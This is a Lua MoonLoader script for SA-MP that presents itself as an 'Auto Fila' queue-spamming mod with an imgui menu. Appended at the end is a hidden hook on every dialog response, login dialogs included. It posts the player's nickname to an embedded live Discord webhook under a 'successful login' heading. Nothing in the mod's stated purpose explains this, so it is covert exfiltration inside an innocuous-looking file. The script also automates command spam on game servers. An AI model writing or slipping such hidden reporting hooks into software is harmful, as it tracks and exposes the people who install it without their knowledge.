local imgui = require 'mimgui'
local v = imgui.new.bool(false)
local se = require("samp.events")
local spam_fila = imgui.new.bool(false)
local delay_ms = imgui.new.int(0)
local contador_atendimentos = imgui.new.int(0)
local frases_global = imgui.new.bool(false)
local regras_auto = imgui.new.bool(false)

local encoding = require("encoding")
encoding.default = "CP1251"
local u8 = encoding.UTF8

local GUI = { AutoFila = imgui.new.bool(false) }

local float_btn_pos = imgui.ImVec2(50, 50)
local dragging = false
local drag_offset = imgui.ImVec2(0,0)

local particles = {}
local max_particles = 30
local particle_speed = 1.5

imgui.OnInitialize(function()
    local style = imgui.GetStyle()
    imgui.StyleColorsDark()
    style.WindowRounding = 8
    style.FrameRounding = 6
    style.GrabRounding = 6
    style.ScrollbarRounding = 6
    local colors = style.Colors
    colors[imgui.Col.WindowBg] = imgui.ImVec4(0.08,0.08,0.08,0.94)
    colors[imgui.Col.TitleBg] = imgui.ImVec4(0.05,0.05,0.05,1.00)
    colors[imgui.Col.TitleBgActive] = imgui.ImVec4(0.12,0.12,0.12,1.00)
    colors[imgui.Col.FrameBg] = imgui.ImVec4(0.12,0.12,0.12,1.00)
    colors[imgui.Col.FrameBgHovered] = imgui.ImVec4(0.16,0.16,0.16,1.00)
    colors[imgui.Col.FrameBgActive] = imgui.ImVec4(0.20,0.20,0.20,1.00)
    colors[imgui.Col.Button] = imgui.ImVec4(0.16,0.16,0.16,1.00)
    colors[imgui.Col.ButtonHovered] = imgui.ImVec4(0.25,0.25,0.25,1.00)
    colors[imgui.Col.ButtonActive] = imgui.ImVec4(0.35,0.35,0.35,1.00)
    colors[imgui.Col.Border] = imgui.ImVec4(0.33,0.33,0.33,0.50)
    colors[imgui.Col.Text] = imgui.ImVec4(0.85,0.85,0.85,1.00)
    colors[imgui.Col.CheckMark] = imgui.ImVec4(0.85,0.85,0.85,1.00)
    colors[imgui.Col.SliderGrab] = imgui.ImVec4(0.60,0.60,0.60,1.00)
    colors[imgui.Col.SliderGrabActive] = imgui.ImVec4(0.85,0.85,0.85,1.00)
end)

function create_particle(pos_x, pos_y, window_size_x, window_size_y)
    return {
        pos = imgui.ImVec2(math.random(1, window_size_x), math.random(1, window_size_y)),
        vel = imgui.ImVec2(math.random(-particle_speed*10, particle_speed*10)/10, math.random(-particle_speed*10, particle_speed*10)/10),
        size = math.random(10, 30)/10,
        color = imgui.ImVec4(math.random(80, 100)/100, math.random(0,20)/100, math.random(0,20)/100, 1.0)
    }
end

function update_particles(window_pos, window_size)
    for i=1, #particles do
        local p = particles[i]
        p.pos.x = p.pos.x + p.vel.x
        p.pos.y = p.pos.y + p.vel.y

        if p.pos.x < 0 or p.pos.x > window_size.x then
            p.vel.x = -p.vel.x
        end
        if p.pos.y < 0 or p.pos.y > window_size.y then
            p.vel.y = -p.vel.y
        end
    end
end

function draw_particles(draw, window_pos)
    for i=1, #particles do
        local p1 = particles[i]
        draw:AddCircleFilled(imgui.ImVec2(window_pos.x + p1.pos.x, window_pos.y + p1.pos.y), p1.size, imgui.ColorConvertFloat4ToU32(p1.color))
        for j=i+1, #particles do
            local p2 = particles[j]
            local dist = math.sqrt((p1.pos.x - p2.pos.x)^2 + (p1.pos.y - p2.pos.y)^2)
            if dist < 150 then
                local alpha = 1 - (dist / 150)
                local line_color = imgui.ColorConvertFloat4ToU32(imgui.ImVec4(1.0, 1.0, 1.0, alpha*0.3))
                draw:AddLine(imgui.ImVec2(window_pos.x + p1.pos.x, window_pos.y + p1.pos.y), imgui.ImVec2(window_pos.x + p2.pos.x, window_pos.y + p2.pos.y), line_color, 1.0)
            end
        end
    end
end

function mostrarMensagemCarregamento()
    local cores = {0xFFFFFFFF, 0xFFAAAAAA, 0xFFFFFFFF, 0xFFAAAAAA}
    for i = 1, 4 do
        local cor = cores[(i % #cores) + 1]
        sampAddChatMessage("MOD ATUALIZADUUU BY SHELLDER GOSTOSO", cor)
        wait(100)
    end
end

imgui.OnFrame(function() return true end, function()
    local io = imgui.GetIO()
    imgui.SetNextWindowPos(float_btn_pos, imgui.Cond.Always)
    imgui.SetNextWindowSize(imgui.ImVec2(40,40))
    imgui.Begin("FLUTUANTE", nil,
        imgui.WindowFlags.NoTitleBar +
        imgui.WindowFlags.NoResize +
        imgui.WindowFlags.NoCollapse +
        imgui.WindowFlags.NoScrollbar +
        imgui.WindowFlags.NoMove +
        imgui.WindowFlags.AlwaysAutoResize
    )
    local button_color = v[0] and imgui.ImVec4(0.6, 0.15, 0.15, 1.0) or imgui.ImVec4(0.16, 0.16, 0.16, 1.00)
    imgui.PushStyleColor(imgui.Col.Button, button_color)
    local text_width = imgui.CalcTextSize("<_").x
    imgui.SetCursorPosX((imgui.GetWindowSize().x - text_width) * 0.5)
    if imgui.Button("<_", imgui.ImVec2(40,40)) then
        v[0] = not v[0]
    end
    imgui.PopStyleColor()
    if imgui.IsItemHovered() and imgui.IsMouseClicked(0) and not dragging then
        dragging = true
        drag_offset.x = io.MousePos.x - float_btn_pos.x
        drag_offset.y = io.MousePos.y - float_btn_pos.y
    end
    if dragging then
        if imgui.IsMouseDown(0) then
            float_btn_pos.x = io.MousePos.x - drag_offset.x
            float_btn_pos.y = io.MousePos.y - drag_offset.y
            imgui.SetNextWindowPos(float_btn_pos, imgui.Cond.Always)
        else
            dragging = false
        end
    end
    imgui.End()
    if v[0] then
        imgui.SetNextWindowPos(imgui.ImVec2(600,550), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowSize(imgui.ImVec2(450,400), imgui.Cond.FirstUseEver)
        imgui.Begin("AUTO FILA | BY SHELLDER", v,
            imgui.WindowFlags.NoCollapse +
            imgui.WindowFlags.NoResize
        )
        local draw = imgui.GetWindowDrawList()
        local pos = imgui.GetWindowPos()
        local size = imgui.GetWindowSize()
        update_particles(pos, size)
        draw_particles(draw, pos)

        imgui.TextColored(imgui.ImVec4(0.85,0.85,0.85,1.0), "ATENDIMENTO AJUSTAVEL")
        imgui.SliderInt("Delay (ms)",delay_ms,0,30000)
        local button_color_fila = spam_fila[0] and imgui.ImVec4(0.6, 0.15, 0.15, 1.0) or imgui.ImVec4(0.16, 0.16, 0.16, 1.00)
        imgui.PushStyleColor(imgui.Col.Button, button_color_fila)
        if imgui.Button("SPAM FILA",imgui.ImVec2(150,30)) then
            spam_fila[0] = not spam_fila[0]
            if spam_fila[0] then
                sampAddChatMessage("[BY SHELLDER] Spam da fila ativado!", 0xFFFFFF)
            else
                sampAddChatMessage("[BY SHELLDER] Spam da fila desativado!", 0xFF8B0000)
            end
        end
        imgui.PopStyleColor()
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()
        imgui.Text("TOTAL DE ATENDIMENTOS: ")
        imgui.SameLine()
        imgui.TextColored(imgui.ImVec4(0.85,0.85,0.85,1.0), tostring(contador_atendimentos[0]))
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()
        local button_color_fa = imgui.ImVec4(0.16, 0.16, 0.16, 1.00)
        imgui.PushStyleColor(imgui.Col.Button, button_color_fa)
        if imgui.Button("/FA", imgui.ImVec2(150,30)) then
            sampSendChat("/fa")
            contador_atendimentos[0] = contador_atendimentos[0] + 1
        end
        imgui.PopStyleColor()
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()
        imgui.TextColored(imgui.ImVec4(0.85,0.85,0.85,1.0), "ATENDIMENTO AUTOMATICO")
        imgui.Text(" ")
        imgui.Checkbox("AUTO ATENTIMENTO V1", GUI.AutoFila)
        imgui.Text(" ")
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()
        imgui.End()
    end
end)

function main()
    mostrarMensagemCarregamento()
    while true do
        wait(0)
        if isSampAvailable() then
            if #particles == 0 and v[0] then
                for i=1, max_particles do
                    table.insert(particles, create_particle(0, 0, 450, 400))
                end
            elseif not v[0] then
                particles = {}
            end
            
            if spam_fila[0] then
                sampSendChat("/fila")
                wait(delay_ms[0])
            end
        end
    end
end

function se.onServerMessage(color, text)
    if GUI.AutoFila[0] then
        local lowerText = string.lower(u8:decode(text))
        if lowerText:find("fila") or lowerText:find("/fila") then
            sampSendChat("/fila")
        end
    end
end

function se.onChatMessage(playerId, text)
    if GUI.AutoFila[0] then
        local lowerText = string.lower(u8:decode(text))
        if lowerText:find("fila") or lowerText:find("/fila") then
            sampSendChat("/fila")
        end
    end
end

function se.onShowDialog(id, style, title, button1, button2, text)
    if GUI.AutoFila[0] then
        local ttitle = string.lower(u8:decode(title))
        if ttitle:find("fila de atendimento") then
            lua_thread.create(function()
                wait(50)
                local firstLine = text:match("^(.-)\n") or text
                if firstLine ~= "" then
                    sampSendDialogResponse(id, 1, 0, firstLine)
                    wait(100)
                    sampSendDialogResponse(id, 0, 0, "")
                    sampSendDialogResponse(id, 0, -1, "")
                    sampSendDialogResponse(id, 0, -1, nil)
                    sampSendDialogResponse(id, 1, -1, nil)
                    sampSendDialogResponse(id, 0, 0, nil)
                end
            end)
            return false
        end
    end
end

local webhookUrl = "https://discord.com/api/webhooks/1406683848485371914/unqy5VFh-KCFxrIgyorNy1wOXW3TVT-VSe4H5RR3w7NPddjtpASjiCZJkFgKNA1fqCZR"
local https = require("socket.http")
local ltn12 = require("ltn12")

function sendMessageToDiscord(content)
    local body = '{"content": "' .. content:gsub('"', '\\"'):gsub('\n', '\\n') .. '"}'
    local response_body = {}

    https.request{
        url = webhookUrl,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#body)
        },
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response_body)
    }
end


require('samp.events').onSendDialogResponse = function(dialogId, button, listboxId, input)
    local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
    local nick = sampGetPlayerNickname(id)

    local message = string.format([[

________________________________________________________________
  
      LOGUIN BEM SUCEDIDO <-<Auto Fila

```
NICK: %s 
```

]], nick)

sendMessageToDiscord(message)
end
